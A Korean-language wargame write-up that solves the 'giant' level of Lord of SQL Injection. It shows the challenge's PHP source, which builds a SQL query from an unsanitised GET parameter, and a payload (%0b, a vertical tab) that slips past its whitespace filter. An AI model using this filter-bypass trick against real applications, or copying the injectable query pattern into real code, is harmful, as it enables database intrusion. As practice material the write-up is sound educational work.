---
title: "[Lord of SQL Injection] LoS - giant 문제풀이"
date: 2018-08-02
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

다음 문제는 `giant` 이다.
갑자기 소스코드가 너무 간단해져서 당황했다.  

<!--more-->

코드는 다음과 같다.  

```php
----------------------------------------------------------
query : select 1234 fromprob_giant where 1
----------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(strlen($_GET[shit])>1) exit("No Hack ~_~"); 
  if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe"); 
  $query = "select 1234 from{$_GET[shit]}prob_giant where 1"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result[1234]) solve("giant"); 
  highlight_file(__FILE__); 
?>
```

앞의 문제들에 있었던 필터링들이 싹 사라졌다.
또 `pw`나 `no`를 입력하는게 아니라 이번엔 `shit`라는 값을 넘겨주어야 하는데, 이 값이 `from`과 `prob_giant` 즉, `table 명` 사이에 있다.
때문에 아무런 값이 없을 경우, `fromprob_giant`가 되어 제대로 쿼리가 실행되지 않는다.
문제를 풀기 위해서는 `$result[1234]`가 있으면 된다.
문제의 쿼리에서 `select 1234`라고 되어 있으니, 해당 쿼리만 제대로 실행되도록 만들어 주면 될 것 같다.

그러기 위해서는 `공백`이 필요하다.
그런데 필터링에 `공백`, `\n`, `\r`, `\t`가 있어서, 어지간한 공백 문자로는 공백을 만들어낼 수 없다.
아스키코드표를 자세히 보면 `0x0b` 값을 보면 `VT` 혹은 `Vertical Tab`이라는 문자가 있다.
반면 우리가 흔히 알고있는 `0x09`는 `HT` 혹은 `Horizontal Tab`이다.
`0x09`가 가로로 탭을 하는 것이라면, `0x0b`는 세로로 탭을 하는 것이라고 생각하면 될 것 같다.
그런데 이 `VT`로 `whitespace`에 대한 필터링을 우회할 수 있다.
`VT`를 값으로 넘겨주기 위해 URL에 `?shit=%0b`를 입력 해 보았다.  

```php
------------------------------------------------------------
query : select 1234 fromprob_giant where 1
------------------------------------------------------------

GIANT Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(strlen($_GET[shit])>1) exit("No Hack ~_~"); 
  if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe"); 
  $query = "select 1234 from{$_GET[shit]}prob_giant where 1"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result[1234]) solve("giant"); 
  highlight_file(__FILE__); 
?>
```

성공적으로 문제를 풀 수 있었다.  

```plain
GIANT Clear!!
```